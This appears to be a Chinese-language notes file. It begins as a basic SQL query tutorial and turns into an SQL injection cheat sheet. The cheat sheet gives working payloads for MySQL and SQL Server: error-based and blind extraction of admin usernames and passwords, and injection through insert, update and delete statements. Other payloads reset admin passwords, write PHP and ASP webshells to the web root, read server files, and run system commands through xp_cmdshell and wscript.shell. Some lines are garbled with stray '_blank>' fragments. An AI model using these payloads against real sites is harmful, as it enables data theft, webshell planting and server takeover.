@@ -1,0 +1,878 @@
+常用SQL查询语句{
+
+一、简单查询语句
+
+1. 查看表结构
+
+SQL>DESC emp;
+
+2. 查询所有列
+
+SQL>SELECT * FROM emp;
+
+3. 查询指定列
+
+SQL>SELECT empmo, ename, mgr FROM emp;
+
+SQL>SELECT DISTINCT mgr FROM emp; 只显示结果不同的项
+
+4. 查询指定行
+
+SQL>SELECT * FROM emp WHERE job='CLERK';
+
+5. 使用算术表达式
+
+SQL>SELECT ename, sal*13+nvl(comm,0)  FROM emp; 
+
+nvl(comm,1)的意思是，如果comm中有值，则nvl(comm,1)=comm; comm中无值，则nvl(comm,1)=0。
+
+SQL>SELECT ename, sal*13+nvl(comm,0) year_sal FROM emp; （year_sal为别名，可按别名排序）
+
+SQL>SELECT * FROM emp WHERE hiredate>'01-1月-82';
+
+6. 使用like操作符（%，_）
+
+%表示一个或多个字符，_表示一个字符，[charlist]表示字符列中的任何单一字符，[^charlist]或者[!charlist]不在字符列中的任何单一字符。
+
+SQL>SELECT * FROM emp WHERE ename like 'S__T%';
+
+7. 在where条件中使用In
+
+SQL>SELECT * FROM emp WHERE job IN ('CLERK','ANALYST');
+
+8. 查询字段内容为空/非空的语句
+
+SQL>SELECT * FROM emp WHERE mgr IS/IS NOT NULL; 
+
+9. 使用逻辑操作符号
+
+SQL>SELECT * FROM emp WHERE (sal>500 or job='MANAGE') and ename like 'J%';
+
+10. 将查询结果按字段的值进行排序
+
+SQL>SELECT * FROM emp ORDER BY deptno, sal DESC; (按部门升序，并按薪酬降序)
+
+11.基本增删改查
+creat
+insert
+delete
+update
+select
+
+二、复杂查询
+
+1. 数据分组(max,min,avg,sum,count)
+
+SQL>SELECT MAX(sal),MIN(age),AVG(sal),SUM(sal) from emp;
+
+SQL>SELECT * FROM emp where sal=(SELECT MAX(sal) from emp));
+
+SQL>SELEC COUNT(*) FROM emp;
+
+2. group by（用于对查询结果的分组统计） 和 having子句（用于限制分组显示结果）
+
+SQL>SELECT deptno,MAX(sal),AVG(sal) FROM emp GROUP BY deptno;
+
+SQL>SELECT deptno, job, AVG(sal),MIN(sal) FROM emp group by deptno,job having AVG(sal)<2000;
+
+对于数据分组的总结：
+
+a. 分组函数只能出现在选择列表、having、order by子句中（不能出现在where中）
+
+b. 如果select语句中同时包含有group by, having, order by，那么它们的顺序是group by, having, order by。
+
+c. 在选择列中如果有列、表达式和分组函数，那么这些列和表达式必须出现在group by子句中，否则就是会出错。
+
+使用group by不是使用having的前提条件。
+
+3. 多表查询
+
+SQL>SELECT e.name,e.sal,d.dname FROM emp e, dept d WHERE e.deptno=d.deptno order by d.deptno;
+
+SQL>SELECT e.ename,e.sal,s.grade FROM emp e,salgrade s WHER e.sal BETWEEN s.losal AND s.hisal;
+
+4. 自连接（指同一张表的连接查询）
+
+SQL>SELECT er.ename, ee.ename mgr_name from emp er, emp ee where er.mgr=ee.empno;
+
+5. 子查询（嵌入到其他sql语句中的select语句，也叫嵌套查询）
+
+5.1 单行子查询
+
+SQL>SELECT ename FROM emp WHERE deptno=(SELECT deptno FROM emp where ename='SMITH');查询表中与smith同部门的人员名字。因为返回结果只有一行，所以用“=”连接子查询语句
+
+5.2 多行子查询
+
+SQL>SELECT ename,job,sal,deptno from emp WHERE job IN (SELECT DISTINCT job FROM emp WHERE deptno=10);查询表中与部门号为10的工作相同的员工的姓名、工作、薪水、部门号。因为返回结果有多行，所以用“IN”连接子查询语句。
+
+in与exists的区别： exists() 后面的子查询被称做相关子查询，它是不返回列表的值的。只是返回一个ture或false的结果，其运行方式是先运行主查询一次，再去子查询里查询与其对 应的结果。如果是ture则输出，反之则不输出。再根据主查询中的每一行去子查询里去查询。in()后面的子查询，是返回结果集的，换句话说执行次序和 exists()不一样。子查询先产生结果集，然后主查询再去结果集里去找符合要求的字段列表去。符合要求的输出，反之则不输出。
+
+5.3 使用ALL
+
+SQL>SELECT ename,sal,deptno FROM emp WHERE sal> ALL (SELECT sal FROM emp WHERE deptno=30);或SQL>SELECT ename,sal,deptno FROM emp WHERE sal> (SELECT MAX(sal) FROM emp WHERE deptno=30);查询工资比部门号为30号的所有员工工资都高的员工的姓名、薪水和部门号。以上两个语句在功能上是一样的，但执行效率上，函数会高 得多。
+
+5.4 使用ANY
+
+SQL>SELECT ename,sal,deptno FROM emp WHERE sal> ANY (SELECT sal FROM emp WHERE deptno=30);或SQL>SELECT ename,sal,deptno FROM emp WHERE sal> (SELECT MIN(sal) FROM emp WHERE deptno=30);查询工资比部门号为30号的任意一个员工工资高（只要比某一员工工资高即可）的员工的姓名、薪水和部门号。以上两个语句在功能上是 一样的，但执行效率上，函数会高得多。
+
+5.5 多列子查询
+
+SQL>SELECT * FROM emp WHERE (job, deptno)=(SELECT job, deptno FROM emp WHERE ename='SMITH');
+
+5.6 在from子句中使用子查询
+
+ SQL>SELECT emp.deptno,emp.ename,emp.sal,t_avgsal.avgsal FROM emp,(SELECT emp.deptno,avg(emp.sal) avgsal FROM emp GROUP BY emp.deptno) t_avgsal where emp.deptno=t_avgsal.deptno AND emp.sal>t_avgsal.avgsal ORDER BY emp.deptno;
+
+5.7 分页查询
+
+数据库的每行数据都有一个对应的行号，称为rownum.
+
+SQL>SELECT a2.* FROM (SELECT a1.*, ROWNUM rn FROM (SELECT * FROM emp ORDER BY sal) a1 WHERE ROWNUM<=10) a2 WHERE rn>=6;
+
+指定查询列、查询结果排序等，都只需要修改最里层的子查询即可。
+
+5.8 用查询结果创建新表
+
+SQL>CREATE TABLE mytable (id,name,sal,job,deptno) AS SELECT empno,ename,sal,job,deptno FROM emp;
+
+5.9 合并查询（union 并集, intersect 交集, union all 并集+交集, minus差集)
+
+SQL>SELECT ename, sal, job FROM emp WHERE sal>2500 UNION(INTERSECT/UNION ALL/MINUS) SELECT ename, sal, job FROM emp WHERE job='MANAGER';
+
+合并查询的执行效率远高于and,or等逻辑查询。
+
+ 5.10 使用子查询插入数据
+
+SQL>CREATE TABLE myEmp(empID number(4), name varchar2(20), sal number(6), job varchar2(10), dept number(2)); 先建一张空表；
+
+SQL>INSERT INTO myEmp(empID, name, sal, job, dept) SELECT empno, ename, sal, job, deptno FROM emp WHERE deptno=10; 再将emp表中部门号为10的数据插入到新表myEmp中，实现数据的批量查询。
+
+5.11 使用了查询更新表中的数据
+
+SQL>UPDATE emp SET(job, sal, comm)=(SELECT job, sal, comm FROM emp where ename='SMITH') WHERE ename='SCOTT';
+5.12 拼接查询concat
+	1>CONCAT拼接字符串
+		SELECT CONCAT('HELLO', ' WORLD') AS expr
+		GROUP_CONCAT可以和GROUP BY语句一起用
+		SELECT GROUP_CONCAT(name) AS names FROM xxx
+    2>SELECT GROUP_CONCAT(name) AS names FROM xxx GROUP BY yy
+		将符合条件的同一列中的不同行数据拼接, 以逗号分隔
+		names返回的是blob类型, 在java中需要特殊处理, 否则出错：
+			No Dialect mapping for JDBC type:
+		或者将其转化为varchar类型
+	3>SELECT TRIM(GROUP_CONCAT(name)) AS names FROM xxx
+
+三、特殊查询
+(一)CONCAT（）
+CONCAT（）函数用于将多个字符串连接成一个字符串。
+使用数据表Info作为示例，其中SELECT id,name FROM info LIMIT 1;的返回结果为
++----+--------+
+| id | name   |
++----+--------+
+|  1 | BioCyc |
++----+--------+
+1、语法及使用特点：
+CONCAT(str1,str2,…)                       
+返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。
+
+2、使用示例：
+SELECT CONCAT(id, ‘，’, name) AS con FROM info LIMIT 1;返回结果为
++----------+
+| con      |
++----------+
+| 1,BioCyc |
++----------+
+
+SELECT CONCAT(‘My’, NULL, ‘QL’);返回结果为
++--------------------------+
+| CONCAT('My', NULL, 'QL') |
++--------------------------+
+| NULL                     |
++--------------------------+
+
+3、如何指定参数之间的分隔符
+使用函数CONCAT_WS（）。使用语法为：CONCAT_WS(separator,str1,str2,…)
+CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。
+
+如SELECT CONCAT_WS('_',id,name) AS con_ws FROM info LIMIT 1;返回结果为
++----------+
+| con_ws   |
++----------+
+| 1_BioCyc |
++----------+
+
+SELECT CONCAT_WS(',','First name',NULL,'Last Name');返回结果为
++----------------------------------------------+
+| CONCAT_WS(',','First name',NULL,'Last Name') |
++----------------------------------------------+
+| First name,Last Name                         |
++----------------------------------------------+
+
+4、GROUP_CONCAT（）函数
+GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。
+使用表info作为示例，其中语句SELECT locus,id,journal FROM info WHERE locus IN('AB086827','AF040764');的返回结果为
++----------+----+--------------------------+
+| locus    | id | journal                  |
++----------+----+--------------------------+
+| AB086827 |  1 | Unpublished              |
+| AB086827 |  2 | Submitted (20-JUN-2002)  |
+| AF040764 | 23 | Unpublished              |
+| AF040764 | 24 | Submitted (31-DEC-1997)  |
++----------+----+--------------------------+
+
+1>使用语法及特点：
+GROUP_CONCAT([DISTINCT] expr [,expr ...]
+[ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col ...]]
+[SEPARATOR str_val])
+在 MySQL 中，你可以得到表达式结合体的连结值。通过使用 DISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 ORDER BY 子句。
+SEPARATOR 是一个字符串值，它被用于插入到结果值中。缺省为一个逗号 (",")，可以通过指定 SEPARATOR "" 完全地移除这个分隔符。
+可以通过变量 group_concat_max_len 设置一个最大的长度。在运行时执行的句法如下： SET [SESSION | GLOBAL] group_concat_max_len = unsigned_integer;
+如果最大长度被设置，结果值被剪切到这个最大长度。如果分组的字符过长，可以对系统参数进行设置：SET @@global.group_concat_max_len=40000;
+
+2>使用示例：
+语句 SELECT locus,GROUP_CONCAT(id) FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus; 的返回结果为
++----------+------------------+
+| locus    | GROUP_CONCAT(id) |
++----------+------------------+
+| AB086827 | 1,2              |
+| AF040764 | 23,24            |
++----------+------------------+
+
+语句 SELECT locus,GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;的返回结果为
++----------+----------------------------------------------------------+
+| locus    | GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') |
++----------+----------------------------------------------------------+
+| AB086827 | 2_1                                                      |
+| AF040764 | 24_23                                                    |
++----------+----------------------------------------------------------+
+
+语句SELECT locus,GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;的返回结果为
++----------+--------------------------------------------------------------------------+
+| locus    | GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') |
++----------+--------------------------------------------------------------------------+
+| AB086827 | 2, Submitted (20-JUN-2002). 1, Unpublished                               |
+| AF040764 | 24, Submitted (31-DEC-1997) . 23, Unpublished                            |
++----------+--------------------------------------------------------------------------+
+
+四、sql函数
+{
+substring
+	SUBSTRING(str,pos)
+	SUBSTRING(str FROM pos)
+	SUBSTRING(str,pos,len)
+	SUBSTRING(str FROM pos FOR len)	
+ord(char)函数返回字符串第一个字符的 ASCII 值。
+ASCII(str)返回最左边的字符的字符串str的数值。如果str是空字符串，返回0。如果str为NULL，返回NULL。 ASCII()是从0到255的数值的字符。
+database()
+version()
+user()
+
+1.mid()函数
+
+mid(striing,start,length)
+
+string(必需)规定要返回其中一部分的字符串。
+
+start(必需)规定开始位置（起始值是 1）。
+
+length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。
+
+
+2.substr()函数
+
+substr(string,start,length)
+
+string(必需)规定要返回其中一部分的字符串。
+
+start(必需)规定在字符串的何处开始。
+
+length(可选)规定被返回字符串的长度。
+
+
+3.left()函数
+
+left(string,length)
+
+再怎么解释也不如直接开弄
+
+string(必需)规定要返回其中一部分的字符串
+
+length（可选）规定被返回字符串的前length长度的字符
+}
+}
+
+
+注入常见类型及思路
+{
+	数字型注入
+	字符型注入
+	GET型注入
+	POST注入
+	cookie注入
+	代理注入
+	error-based
+	{
+		 1、通过floor暴错
+		/*数据库版本*/
+		and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		/*简单办法暴库*/
+		id=info()
+		/*连接用户*/
+		and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		/*连接数据库*/
+		and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		/*暴库*/
+		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		/*暴表*/
+		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		/*暴字段*/
+		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		/*暴内容*/
+		and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+		
+		2、ExtractValue(有长度限制,最长32位)
+		and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+		or extractvalue(1,concat(0x7e,database())) or
+		and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
+		
+		3、UpdateXml(有长度限制,最长32位)
+		and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+		and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+		
+		4、NAME_CONST(适用于低版本)
+		and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
+		
+		5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)
+		/*数据库版本*/
+		or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 
+	}
+	
+	http头注入之X-Forwarded-For
+	http头注入Client-IP
+	http头注入之x-remote-IP
+	http头注入之x-originating-IP
+	http头注入之x-remote-addr
+
+
+	盲注之基于时间延迟sleep/benchmark
+		select 1 from te where if(1=1,sleep(1),1) limit 0,1;
+		' or sleep(ord(substr(password,1,1))) --
+		select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));
+	盲注之基于boolean
+		select 123 from dual where 1=1
+		select 123 from dual where 1=0;
+		http://192.168.1.1/1.php?id=1' and length(database())=8 %23
+		http://192.168.1.1/1.php?id=1' and left(database(),1)<'t' %23
+		http://192.168.1.1/1.php?id=1' and ascii(substr(select(database()),2,1))>100%23
+		select 1 from te order by if(1,1,(select 1 union select 2)) limit 0,3;
+		select 1 from te order by if(0,1,(select 1 union select 2)) limit 0,3;
+		IF(expr1,expr2,expr3),expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果
+	盲注之errorbased
+		select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
+		select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)		
+		select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
+		select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));
+		select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1));  
+		其他数据库：
+			PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- 
+			MSSQL: /?param=1 and(1)=convert(int,@@version)-- 
+			Sybase: /?param=1 and(1)=convert(int,@@version)-- 
+			Oracle >=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select 
+			replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
+				
+	算法：字频统计
+		二分查找，位运算法
+	二次注入
+	
+	注入搜集信息
+	注入获取数据
+	注入读取文件
+	注入写入文件（webshell）
+	注入直接拿os-shell
+	
+	insert注入
+		报错注入：
+			insert into test.user (id,user,pwd) values (10,’user’,'pass’ and 1=(updatexml(1,concat(0x5e24,(select password from mysql.user limit 1),0x5e24),1)));
+			INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or'', 'Nervo');
+			
+			insert into user (user,password) values(‘inject’,'xss’ and extractvalue(1, concat(0x5c,(select password from mysql.user limit 1))));
+			INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,database())) or'', 'Nervo');
+			
+			INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,		0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or'', 'Nervo');
+			
+			insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);
+
+		延时注入
+			insert into test.user (id,user,pwd) values (11,’user’,'pass’ and (select if(mid(user(),1,1)=’r',sleep(5),0)));
+	updata注入
+		UPDATE users SET password='Nicky' or updatexml(2,concat(0x7e,(version())),0) or''WHERE id=2 and username='Olivia';
+		UPDATE users SET password='Nicky' or extractvalue(1,concat(0x7e,database())) or'' WHERE id=2 and username='Nervo';
+		UPDATE users SET password='Nicky' or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.		tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' WHERE id=2 and username='Nervo';
+		
+		select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
+	union注入
+		union select
+	delete注入
+		DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or'';
+		DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x7e,database())) or'';
+		DELETE FROM users WHERE id=1 or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables 		limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' ;
+	
+	提取数据payload
+		INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or'', 'Nervo');
+		
+		INSERT INTO users (id, username, password) VALUES (2,'Olivia' or extractvalue(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 1,1))) or'', 'Nervo');
+		
+		INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '','Nervo');
+		
+		INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');
+		
+		INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT concat(0x7e,0x27,cast(users.username as char),0x27,0x7e) FROM `newdb`.users LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');
+		
+	闭合变种
+	{
+		' or (payload) or '
+		' and (payload) and '
+		' or (payload) and '
+		' or (payload) and '='
+		'* (payload) *'
+		' or (payload) and '
+		" – (payload) – "
+	}
+	
+	参考文章
+	{
+		http://dev.mysql.com/
+
+		http://websec.ca/kb/sql_injection
+
+		from：http://www.exploit-db.com/wp-content/themes/exploit/docs/33253.pdf
+	}
+}
+常用注入语句
+{
+	
+	判断注入点：
+整形参数判断
+    1、直接加'  2、and 1=1  3、 and 1=2
+    如果1、3运行异常 2正常就存在注入
+字符型判断
+    1、直接加'  2、and '1'='1'  3、 and '1'='2'
+搜索型： 关键字%' and 1=1 and '%'='%  
+        关键字%' and 1=2 and '%'='%
+    如果1、3运行异常 2正常就存在注入 
+	
+	order by 3
+	select @@version,database(),user()
+
+
+	union select table_name from information_schema.tables where table_schema=database()
+	union select column_name from information_schema.columns where table_name=$tablename
+	union select $column from $tablename
+	
+	获取数据库版本
+		and (select @@version)>0
+	获取当前数据库名
+		and db_name()>0
+	获取当前数据库用户名
+		and user>0
+		and user_name()='dbo'
+		
+	猜解所有数据库名称
+		and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0
+	猜解表的字段名称
+		and (Select Top 1 col_name(object_id('表名'),1) from sysobjects)>0
+		and (select top 1 asernaose from admin where id =1)>1
+		.asp?id=xx having 1=1  其中admin.id就是一个表名admin 一个列名id
+		.asp?id=xx group by admin.id having 1=1 可以得到列名
+		.asp?id=xx group by admin.id,admin.username having 1=1 得到另一个列名 页面要和表有联系
+	
+	如果知道了表名和字段名就可以爆出准确的值
+	union select 1,2,username,password,5,6,7,8,9,10,11,12 from usertable where id=6
+	
+	爆账号
+		union select min(username),1,1,1，.. from users where username > 'a'
+	依次循环爆其余的账号
+		union select min(username),1,1,1,.. from users where username > 'admin'
+		;begin declare @ret varchar(8000) set @ret=':' select @ret=@ret+' '+username+'/'+password from userstable where username>@ret select @ret as ret into foo end
+	修改管理员的密码为123
+		.asp?id=××;update admin set password='123' where id =1
+		.asp?id=××;insert into admin(asd,..) values(123,..) –就能能往admin中写入123了
+	rebots.txt
+	
+	猜解数据库中用户名表的名称
+		and (select count(*) from 数据库.dbo.表名)>0
+	若表名存在，则工作正常，否则异常
+		得到用户名表的名称，基本的实现方法是
+		1：
+		and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 )>0 或
+		and (Select Top 1 name from sysobjects where xtype=’U’ and status>0)>0
+		  但在异常中却可以发现表的名称。假设发现的表名是xyz，则
+		2：
+		and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'，'..'..))>0
+		  可以得到第二个用户建立的表的名称，同理就可得到所有用建立的  表的名称
+		3:
+		and (select top l name from (select top [N]id,name from bysobjects where  xtype=char(85)) T order  by  id  desc)＞1 Ｎ为数据库中地N个表
+		利用系统表区分数据库类型
+		and (select count(*) from  sysobjects)>0
+		and (select count(*) from msysobjects)>0
+		若是SQL-SERVE则第一条,ACCESS则两条都会异常
+		判断是否有比较高的权限
+		and 1=(select is_srvrolemember('sysadmin'))
+		and 1=(select is_srvrolemember('serveradmin'))
+		判断当前数据库用户名是否为db_owner:
+		and 1=(select is_member('db_owner'))
+		xp_cmdshell
+		:exec master..xp_cmdshell '要执行的cmd命令'
+		判断长度
+		and (select top 1 len(字段) from 表名)>5
+		爆料出正确值
+		and (select top 1 asc(substring(字段,1,1)) from 表名)>0
+	差异备份
+		//备份数据库到某处
+			;backup database 数据库名 to disk ='c:\\charlog.bak';--
+		//创建名为datachar的表
+			;create table [dbo].[datachar] ([cmd] [image])    	//cmd为列名 image 数据类型
+		//插入值,为一句话木马的16进制形式：<%execute(request("a"))%>
+			;insert into datachar(cmd)values(0x3C25657865637574652872657175657374282261222929253E)—
+		//进行差异备份,把不同的信息备份到某处
+			;backup database 数据库名 to disk='目录' WITH DIFFERENTIAL,FORMAT;-- 
+			
+	读写文件：
+		select 1,load_file('c:/boot.ini'),3,4 from ka_admin
+		select '<?php eval($_POST[cmd])?>' into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php' 
+		select * from a into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php'
+		注意事项：
+			（1）outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成\',那么基本没的玩了。
+				唯一的一种可能就是你使用mysql远程连接，然后直接在mysql中执行命令，就没有查询限制了。当然，你要是找到了phpmyadmin，也可以。
+			（2）load_file，后面的路径可以是单引号、0x、char转换的字符。这而记得路径中的斜杠是/而不是\。
+				一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。
+			（3）load_file可以在union中作为一个字段来用。如union select 1,load_file('c:/boot.ini'),3,4 from ka_admin等。
+			（4）load_file可以在where字句中使用。如 and length(load_file(0x633A2F626F6F742E696E69))>1
+			（5）load_file文件的时候，特别是想看exe等含有二进制的00等截断或者回车 换行等特殊符号时，可以结合hex函数。
+			如union select 1,hex(load_file('c:/windows/notepad.exe')),3 from xxxx，这样就不会存在截断了，也不会一会断行而截断。自己再用个工具或者几行代码转换回来就是了。
+			（6）outfile一句话（经典）：
+			select '<?php eval($_POST[cmd])?>' into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php'或者从表中
+			select * from a into outfile 'D:/PHPnow-1.5.4/htdocs/index2.php'
+			 （7）关于mysql多语句：直接在mysql中，可以同时select中使用update或者insert，但是php注入中就不行，至少我测试的是php的函数mysql_query是不行。
+					
+	load_file()、 into outfile() 、informaction_schema、char()、cast()和limit
+	
+	{1.判断有无注入点
+; and 1=1 and 1=2
+
+2.猜表一般的表的名称无非是admin adminuser user pass password 等..
+and 0<>(select count(*) from *)
+and 0<>(select count(*) from admin) ---判断是否存在admin这张表
+
+3.猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个
+and 0<(select count(*) from admin)
+and 1<(select count(*) from admin)
+
+4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.
+and 1=(select count(*) from admin where len(*)>0)--
+and 1=(select count(*) from admin where len(用户字段名称name)>0)
+and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)
+
+5.猜解各个字段的长度 猜解长度就是把>0变换 直到返回正确页面为止
+and 1=(select count(*) from admin where len(*)>0)
+and 1=(select count(*) from admin where len(name)>6) 错误
+and 1=(select count(*) from admin where len(name)>5) 正确 长度是6
+and 1=(select count(*) from admin where len(name)=6) 正确
+
+and 1=(select count(*) from admin where len(password)>11) 正确
+and 1=(select count(*) from admin where len(password)>12) 错误 长度是12
+and 1=(select count(*) from admin where len(password)=12) 正确
+
+6.猜解字符
+and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位
+and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位
+就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了
+and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --
+这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的 ASSIC码就OK.最后把结果再转换成字符.
+
+group by users.id having 1=1--
+group by users.id, users.username, users.password, users.privs having 1=1--
+; insert into users values( 666, attacker, foobar, 0xffff )--
+
+UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable-
+UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable Where COLUMN_blank>_NAME NOT IN (login_blank>_id)-
+UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable Where COLUMN_blank>_NAME NOT IN (login_blank>_id,login_blank>_name)-
+UNION Select TOP 1 login_blank>_name FROM logintable-
+UNION Select TOP 1 password FROM logintable where login_blank>_name=Rahul--
+
+看_blank>服务器打的补丁=出错了打了SP4补丁
+and 1=(select @@VERSION)--
+
+看_blank>数据库连接账号的权限，返回正常，证明是 _blank>服务器角色sysadmin权限。
+and 1=(Select IS_blank>_SRVROLEMEMBER(sysadmin))--
+
+判断连接_blank>数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）
+and sa=(Select System_blank>_user)--
+and user_blank>_name()=dbo--
+and 0<>(select user_blank>_name()--
+
+看xp_blank>_cmdshell是否删除
+and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = X AND name = xp_blank>_cmdshell)--
+
+xp_blank>_cmdshell被删除，恢复,支持绝对路径的恢复
+;EXEC master.dbo.sp_blank>_addextendedproc xp_blank>_cmdshell,xplog70.dll--
+;EXEC master.dbo.sp_blank>_addextendedproc xp_blank>_cmdshell,c:\inetpub\wwwroot\xplog70.dll--
+
+反向PING自己实验
+;use master;declare @s int;exec sp_blank>_oacreate "wscript.shell",@s out;exec sp_blank>_oamethod @s,"run",NULL,"cmd.exe /c ping 192.168.0.1";--
+
+加帐号
